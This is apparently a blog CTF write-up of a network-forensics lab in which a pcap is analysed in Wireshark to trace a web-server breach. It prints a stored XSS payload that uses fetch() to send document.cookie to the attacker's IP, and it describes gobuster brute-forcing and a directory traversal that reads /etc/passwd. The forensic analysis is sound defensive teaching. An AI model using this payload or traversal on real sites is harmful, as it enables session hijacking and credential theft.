---
title: "Cyberdefenders RetailBreach Lab"
date: 2025-01-04
media_subpath: /assets/posts/2025-01-04-cyberdefenders-retailbreach-lab
published: true
layout: post
categories:
- ctf
- blue team
tags:
- cyberdefenders
- blueteam
- network forensics
- wireshark
- pcap
- red team
---


### Question 1

To begin this lab, we'll first read over the README in the 'start here' directory. From this we gather the following information about the scenario

- We are a cybersecurity analyst for an online retailer platform called ShopSphere
- There has been an unusual pattern of administrative logins late at night suggesting a breach
- We have a pcap file `RetailBreach.pcap` to analyse with the option of a bunch of different tools like zeek, wireshark, networkminer, etc

Lets start by opening the pcap file with wireshark. Looking at the protocol hierarchy statistics in wireshark we notice the majority of the packets are HTTP packets and we also see there are some SSH packets. Lets first determine whether the administrative logins late at night are via the web page or via SSH directly to the machine

![protocol hierarchy img](proto_hierarchy_retailbreach.png)

But first lets determine the IP of our web server using the filter `http` in wireshark. The destination packets for all the HTTP GET requests are sent to `73.124.17.52` which means this is most likely the IP of the breached web server

Now, if we remove the filter and check all the conversations that took place, we can see there are two other IPs, `111.224.180.128` and `135.143.142.5`, where the conversation with the former involved a substantially larger amount of packets

We want to determine which of the two IPs was the attacker. Lets examine the conversations with each of them, first with the requests sent to and from the web servers /admin directory and /login.php page. Using the following filters

`ip.addr == 135.143.142.5 && http.request.uri contains "admin"`  
`ip.addr == 135.143.142.5 && http.request.uri contains "login.php"`

We can see there were only 6 separate GET requests to the /admin directory and 1 post request sent to login.php, and if we use the filter

`ip.addr == 135.143.142.5 && ssh`

there was no interaction with the web servers SSH server.

This confirms that the attackers ip is `111.224.180.128` due to the fact there were no multiple administrative login attempts from this IP

### Question 2

Now we want to find the brute-forcing tool the attacker used. Brute-forcing tools often use specific or default User-Agent strings to identify themselves. If we use the filter

`ip.addr == 111.224.180.128 && http` 

and scroll down slightly we see there was a large number of get requests sent to directorys which are most likely a brute-force attack (GET /.bash, GET /.passwd, etc), from looking at the HTTP headers in any one of these packets we see the following

![useragent img](useragent_retailbreach.png)

So our answer is gobuster

### Question 3

Now we want to determine the XSS payload utilised by the attacker to compromise the websites integrity. Since we are dealing with an XSS attack which was used to compromise the websites integrity we will be dealing with either a reflected or stored XSS attack. Both of these utilise POST requests so thats where we'll look using the filter 

`ip.addr == 111.224.180.128 && http.request.method == "POST"`

The result is only two packets. If we follow the TCP stream for each one, we find that the payload of the second packet contains the following

![xss_script img](xss_script_retailbreach.png)

Thus the XSS payload is 

`<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

and it was posted to the `/reviews.php` page.

### Question 4

From reading question 4 and answering question 3 we now know that the attacker gained access via an XSS attack to an admin user, we can also deduce from this that it is likely that the admin users' IP was the one other IP within the pcap, `135.143.142.5`. So to find the answer we can filter for

`135.143.142.5 && http.request.uri contains "/reviews.php"`

since we know the ip and the page that contained the vulnerable input. The result is only two packets, if we follow the HTTP stream for each packet we see that in the HTTP response for the GET request sent by packet number 10106 contains the malicious script, so the answer is the UTC time at which packet 10106 was sent which is `29-03-2024 12:09:50`

### Question 5

Now we know the attacker's method: they exploited a stored XSS vulnerability in the /reviews.php page and used this vulnerability to steal an admin users session token, gaining admin access to the website. To get the session token which the attacker utilised we can look at the session token which was used in the GET request which was sent by the target to the vulnerable web page (packet number 10106).

![cookie img](cookie_retailbreach.png)

we can see that the cookie used is `PHPSESSID=lqkctf24s9h9lg67teu8uevn3q`, to confirm this we could correlate this to the cookie which was used by the attacker but since this is the only request where the target visited the compromised webpage with the stored XSS payload we can safely say that this was the cookie used by the attacker.

### Question 6

Now we are investigating a script on the web server which was exploited by the attacker and we also know the session token used so for our filter we are going to use

`ip.addr == 111.224.180.128 && http.request.uri contains "/admin" && http.cookie contains "lqkctf24s9h9lg67teu8uevn3q"`

The result is 5 packets; however, we also see a suspicious packet sent to /admin/log_viewer.php

![directory traversal img](dir_traversal_retailbreach.png)

so the attacker exploited the log_viewer.php script to perform a directory traversal to access the `/etc/passwd` file.

### Question 7

The attacker used directory traversal to access `/etc/passwd` therefore our answer for this is `/etc/passwd/`.
